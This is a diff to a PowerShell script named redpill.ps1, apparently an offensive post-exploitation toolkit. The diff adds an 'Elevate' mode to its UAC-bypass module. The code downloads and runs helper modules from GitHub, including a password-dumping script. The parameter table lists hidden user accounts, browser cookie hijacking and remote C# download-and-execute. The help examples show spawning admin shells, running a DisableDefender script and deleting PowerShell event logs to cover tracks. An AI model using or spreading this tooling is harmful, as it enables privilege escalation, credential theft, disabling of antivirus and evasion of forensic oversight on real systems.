@@ -185,7 +185,7 @@ $ListParameters = @"
   -HiddenUser       Query|Create|Delete  Query \ Create \ Delete Hidden User Accounts
   -CsOnTheFly       https://../script.cs Download\Compile (to exe) and exec CS scripts
   -CookieHijack     Dump|History         Edge|Chrome browser Cookie Hijacking tool
-  -UacMe            Bypass|Clean         UAC bypass|EOP by dll reflection! (cmstp.exe)
+  -UacMe            Bypass|Elevate|Clean UAC bypass|EOP by dll reflection! (cmstp.exe)
 
 "@;
 echo $ListParameters > $Env:TMP\mytable.mt
@@ -1203,7 +1203,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,3642578125/KB
+      If($SizeDump -lt 16){## Corrupted download detected => DefaultFileSize: 16,421875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2553,7 +2553,7 @@ If($UacMe -ne "false"){
       and elevate privileges { user -> admin } or to exec one command with admin privs!
 
    .Parameter UacMe
-      Accepts arguments: Bypass OR Clean
+      Accepts arguments: Bypass, Elevate OR Clean
 
    .Parameter Execute
       Accepts the command\appl to be executed! (cmd|powershell)
@@ -2562,25 +2562,33 @@ If($UacMe -ne "false"){
       Delete artifacts left behind by is 'CreationDate'
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
+      PS C:\> .\redpill.ps1 -UacMe bypass -Execute "regedit.exe"
+      Spawns regedit without uac asking for execution confirmation
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "cmd.exe"
       Local spawns an cmd prompt with administrator privileges! 
    
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "powershell.exe"
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
       Local spawns an powershell prompt with administrator privileges!   
 
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file $Env:TMP\redpill.ps1"
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file $Env:TMP\redpill.ps1"
       Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
    
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file $Env:TMP\DisableDefender.ps1 -Action Stop"
       Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}
 
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -UacMe Clean
+      PS C:\> .\redpill.ps1 -UacMe Clean
       Deletes uac bypass artifacts and powershell eventvwr logs!
       Remark: Admin privileges are required to delete PS logfiles.
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
+      Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
 
    .OUTPUTS
       Payload file written to C:\Windows\Temp\455pj4k3.inf
@@ -2604,7 +2612,7 @@ If($UacMe -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1 -Destination $Env:TMP\UacMe.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,212890625/KB
+      If($SizeDump -lt 19){## Corrupted download detected => DefaultFileSize: 19,3212890625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\UacMe.ps1"){Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2612,10 +2620,10 @@ If($UacMe -ne "false"){
    }
 
    ## Run auxiliary module
-   If($UacMe -ieq "Bypass"){
+   If($UacMe -ieq "Bypass" -or $UacMe -ieq "Elevate"){
       powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe" -Execute "$Execute"
    }ElseIf($UacMe -ieq "Clean"){
-      powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe"
+      powershell -File "$Env:TMP\UacMe.ps1" -Action "$UacMe" -Date "$Date"
    }
 
    ## Clean Artifacts left behind
@@ -4180,43 +4188,47 @@ $HelpParameters = @"
    .SYNOPSIS
       UAC bypass|EOP by dll reflection! (cmstp.exe)
 
-   .DESCRIPTION 
+   .DESCRIPTION
       This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
       using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
       and elevate privileges { user -> admin } or to exec one command with admin privs!
 
    .Parameter UacMe
-      Accepts arguments: Bypass OR Clean
+      Accepts arguments: Bypass, Elevate OR Clean
 
    .Parameter Execute
-      Accepts the command to be executed! (cmd|powershell)
+      Accepts the command\appl to be executed! (cmd|powershell)
 
    .Parameter Date
       Delete artifacts left behind by is 'CreationDate'
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "cmd.exe"
+      PS C:\> .\redpill.ps1 -UacMe bypass -Execute "regedit.exe"
+      Spawns regedit without uac asking for execution confirmation
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "cmd.exe"
       Local spawns an cmd prompt with administrator privileges! 
    
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -UacMe Bypass -Execute "powershell.exe"
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
       Local spawns an powershell prompt with administrator privileges!   
 
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file `$Env:TMP\redpill.ps1"
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\redpill.ps1"
       Executes redpill.ps1 script trougth uac bypass module with elevated shell privs {admin}
    
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -UacMe Bypass -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
+      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
       Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}
 
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -UacMe Clean
+      PS C:\> .\redpill.ps1 -UacMe Clean
       Deletes uac bypass artifacts and powershell eventvwr logs!
       Remark: Admin privileges are required to delete PS logfiles.
 
    .EXAMPLE
-      PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
+      PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
       Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
 
    .OUTPUTS
